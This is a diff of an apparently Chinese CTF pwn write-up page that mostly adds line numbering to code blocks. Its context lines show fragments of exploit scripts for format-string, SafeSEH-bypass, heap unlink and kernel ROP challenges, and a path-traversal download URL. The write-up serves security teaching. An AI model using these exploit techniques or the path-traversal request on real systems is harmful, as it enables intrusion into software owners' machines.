 </span></span><span class=line><span class=cl>	<span class=c1>//安全操作
 </span></span></span><span class=line><span class=cl><span class=c1></span>
 </span></span><span class=line><span class=cl>	<span class=n>puts</span><span class=p>(</span><span class=s>&#34;testing 1...&#34;</span><span class=p>);</span>
@@ -226,8 +422,65 @@ http://ip/download.php?filename=/usr/lib/apache2/modules/mod_cocktail.so</p><p>4
 </span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=n>derived</span><span class=o>*</span> <span class=n>ptr</span> <span class=o>=</span> <span class=k>new</span> <span class=n>derived</span><span class=p>(</span><span class=n>flag</span><span class=p>);</span>
 </span></span><span class=line><span class=cl>	<span class=n>base</span><span class=o>*</span> <span class=n>ptr2</span> <span class=o>=</span> <span class=p>(</span><span class=n>base</span><span class=o>*</span><span class=p>)</span><span class=n>ptr</span><span class=p>;</span>
 </span></span><span class=line><span class=cl>	<span class=n>puts</span><span class=p>(</span><span class=s>&#34;You think I will leave the flag?&#34;</span><span class=p>);</span>
-</span></span></code></pre></div><p>然后的printf&mldr;&mldr;比较常规吧
-其实是因为这个题在三月份的时候就出来了，后来de1ctf里charlie大哥出的unprintable出的比较好，然后printf就被玩烂了&mldr;</p><p>附exp</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span></code></pre></td></tr></table></div></div><p>然后的printf&mldr;&mldr;比较常规吧
+其实是因为这个题在三月份的时候就出来了，后来de1ctf里charlie大哥出的unprintable出的比较好，然后printf就被玩烂了&mldr;</p><p>附exp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
 </span></span><span class=line><span class=cl>
 </span></span><span class=line><span class=cl><span class=c1># context.log_level = &#34;debug&#34;</span>
 </span></span><span class=line><span class=cl><span class=n>do_fmt_ebp_offset</span> <span class=o>=</span> <span class=mi>6</span>
@@ -284,7 +537,106 @@ http://ip/download.php?filename=/usr/lib/apache2/modules/mod_cocktail.so</p><p>4
 </span></span><span class=line><span class=cl>
 </span></span><span class=line><span class=cl><span class=c1># p.sendline(&#34;quit&#34;)</span>
 </span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
-</span></span></code></pre></div><h3 id=babystack>BabyStack</h3><p>通过除0异常进入正确流程后，利用栈溢出覆盖SEH，并在栈上伪造scope_table，从而bypass SafeSEH，控制程序执行流，获取flag。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=babystack>BabyStack</h3><p>通过除0异常进入正确流程后，利用栈溢出覆盖SEH，并在栈上伪造scope_table，从而bypass SafeSEH，控制程序执行流，获取flag。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span><span class=lnt>84
+</span><span class=lnt>85
+</span><span class=lnt>86
+</span><span class=lnt>87
+</span><span class=lnt>88
+</span><span class=lnt>89
+</span><span class=lnt>90
+</span><span class=lnt>91
+</span><span class=lnt>92
+</span><span class=lnt>93
+</span><span class=lnt>94
+</span><span class=lnt>95
+</span><span class=lnt>96
+</span><span class=lnt>97
+</span><span class=lnt>98
+</span><span class=lnt>99
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
 </span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
 </span></span><span class=line><span class=cl>
 </span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>p32</span><span class=p>(</span><span class=n>addr</span><span class=p>):</span>
@@ -383,7 +735,89 @@ http://ip/download.php?filename=/usr/lib/apache2/modules/mod_cocktail.so</p><p>4
 </span></span><span class=line><span class=cl>
 </span></span><span class=line><span class=cl><span class=c1># p.interactive()</span>
 </span></span><span class=line><span class=cl><span class=nb>print</span> <span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
-</span></span></code></pre></div><h3 id=old_pc>old_pc</h3><p>scanf导致的NULL-byte offbyone -> 32位unlink -> 想怎么打就怎么打（各位大哥对不起，下次一定提前提示libc版本号）</p><ul><li>预期解是 unlink+house_of_spirit，没想到还有人被realloc卡住了[狗头]。</li><li>目前见过最骚的非预期是kirin师傅的house_of_prime做法和7o8v师傅的house_of_orange做法。</li></ul><h6 id=exp-from-人人人>exp from 人人人</h6><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=old_pc>old_pc</h3><p>scanf导致的NULL-byte offbyone -> 32位unlink -> 想怎么打就怎么打（各位大哥对不起，下次一定提前提示libc版本号）</p><ul><li>预期解是 unlink+house_of_spirit，没想到还有人被realloc卡住了[狗头]。</li><li>目前见过最骚的非预期是kirin师傅的house_of_prime做法和7o8v师傅的house_of_orange做法。</li></ul><h6 id=exp-from-人人人>exp from 人人人</h6><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
 </span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>time</span> <span class=kn>import</span> <span class=n>sleep</span>
 </span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
 </span></span><span class=line><span class=cl>
@@ -465,7 +899,85 @@ http://ip/download.php?filename=/usr/lib/apache2/modules/mod_cocktail.so</p><p>4
 </span></span><span class=line><span class=cl><span class=n>r</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p32</span><span class=p>(</span><span class=mh>0x19</span><span class=p>)</span><span class=o>+</span><span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p32</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x1b18b0</span><span class=p>),</span><span class=s1>&#39;y&#39;</span><span class=p>,</span><span class=n>data</span> <span class=o>=</span> <span class=s1>&#39;e4SyD1C!&#39;</span><span class=p>,</span><span class=n>fill</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0x3a940</span><span class=p>))</span>
 </span></span><span class=line><span class=cl>
 </span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
-</span></span></code></pre></div><h6 id=exp-from-kirin>exp from Kirin</h6><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span></code></pre></td></tr></table></div></div><h6 id=exp-from-kirin>exp from Kirin</h6><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
 </span></span><span class=line><span class=cl>
 </span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span><span class=o>=</span><span class=s2>&#34;debug&#34;</span>
 </span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>l</span><span class=p>,</span><span class=n>note</span><span class=p>,</span><span class=n>prize</span><span class=p>):</span>
@@ -543,7 +1055,182 @@ http://ip/download.php?filename=/usr/lib/apache2/modules/mod_cocktail.so</p><p>4
 </span></span><span class=line><span class=cl><span class=nb>print</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc_addr</span><span class=p>)</span>
 </span></span><span class=line><span class=cl><span class=c1>#gdb.attach(p)</span>
 </span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
-</span></span></code></pre></div><h6 id=exp-from-7o8v>exp from 7o8v</h6><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span></code></pre></td></tr></table></div></div><h6 id=exp-from-7o8v>exp from 7o8v</h6><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span><span class=lnt>136
+</span><span class=lnt>137
+</span><span class=lnt>138
+</span><span class=lnt>139
+</span><span class=lnt>140
+</span><span class=lnt>141
+</span><span class=lnt>142
+</span><span class=lnt>143
+</span><span class=lnt>144
+</span><span class=lnt>145
+</span><span class=lnt>146
+</span><span class=lnt>147
+</span><span class=lnt>148
+</span><span class=lnt>149
+</span><span class=lnt>150
+</span><span class=lnt>151
+</span><span class=lnt>152
+</span><span class=lnt>153
+</span><span class=lnt>154
+</span><span class=lnt>155
+</span><span class=lnt>156
+</span><span class=lnt>157
+</span><span class=lnt>158
+</span><span class=lnt>159
+</span><span class=lnt>160
+</span><span class=lnt>161
+</span><span class=lnt>162
+</span><span class=lnt>163
+</span><span class=lnt>164
+</span><span class=lnt>165
+</span><span class=lnt>166
+</span><span class=lnt>167
+</span><span class=lnt>168
+</span><span class=lnt>169
+</span><span class=lnt>170
+</span><span class=lnt>171
+</span><span class=lnt>172
+</span><span class=lnt>173
+</span><span class=lnt>174
+</span><span class=lnt>175
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
 </span></span><span class=line><span class=cl>
 </span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span>
 </span></span><span class=line><span class=cl>    <span class=n>log_level</span><span class=o>=</span><span class=s1>&#39;debug&#39;</span><span class=p>,</span>
@@ -718,7 +1405,198 @@ http://ip/download.php?filename=/usr/lib/apache2/modules/mod_cocktail.so</p><p>4
 </span></span><span class=line><span class=cl><span class=n>success</span><span class=p>(</span><span class=s1>&#39;heap base: &#39;</span><span class=o>+</span><span class=nb>hex</span><span class=p>(</span><span class=n>heap_base</span><span class=p>))</span>
 </span></span><span class=line><span class=cl>
 </span></span><span class=line><span class=cl><span class=n>sh</span><span class=p>()</span>
-</span></span></code></pre></div><h3 id=sudrv>sudrv</h3><p>溢出 改栈 rop</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span></span></code></pre></td></tr></table></div></div><h3 id=sudrv>sudrv</h3><p>溢出 改栈 rop</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span><span class=lnt>136
+</span><span class=lnt>137
+</span><span class=lnt>138
+</span><span class=lnt>139
+</span><span class=lnt>140
+</span><span class=lnt>141
+</span><span class=lnt>142
+</span><span class=lnt>143
+</span><span class=lnt>144
+</span><span class=lnt>145
+</span><span class=lnt>146
+</span><span class=lnt>147
+</span><span class=lnt>148
+</span><span class=lnt>149
+</span><span class=lnt>150
+</span><span class=lnt>151
+</span><span class=lnt>152
+</span><span class=lnt>153
+</span><span class=lnt>154
+</span><span class=lnt>155
+</span><span class=lnt>156
+</span><span class=lnt>157
+</span><span class=lnt>158
+</span><span class=lnt>159
+</span><span class=lnt>160
+</span><span class=lnt>161
+</span><span class=lnt>162
+</span><span class=lnt>163
+</span><span class=lnt>164
+</span><span class=lnt>165
+</span><span class=lnt>166
+</span><span class=lnt>167
+</span><span class=lnt>168
+</span><span class=lnt>169
+</span><span class=lnt>170
+</span><span class=lnt>171
+</span><span class=lnt>172
+</span><span class=lnt>173
+</span><span class=lnt>174
+</span><span class=lnt>175
+</span><span class=lnt>176
+</span><span class=lnt>177
+</span><span class=lnt>178
+</span><span class=lnt>179
+</span><span class=lnt>180
+</span><span class=lnt>181
+</span><span class=lnt>182
+</span><span class=lnt>183
+</span><span class=lnt>184
+</span><span class=lnt>185
+</span><span class=lnt>186
+</span><span class=lnt>187
+</span><span class=lnt>188
+</span><span class=lnt>189
+</span><span class=lnt>190
+</span><span class=lnt>191
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
 </span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
 </span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
 </span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
@@ -909,10 +1787,35 @@ http://ip/download.php?filename=/usr/lib/apache2/modules/mod_cocktail.so</p><p>4
 </span></span></span><span class=line><span class=cl><span class=cm>*/</span>
 </span></span><span class=line><span class=cl><span class=c1>//	close(fd2);
 </span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
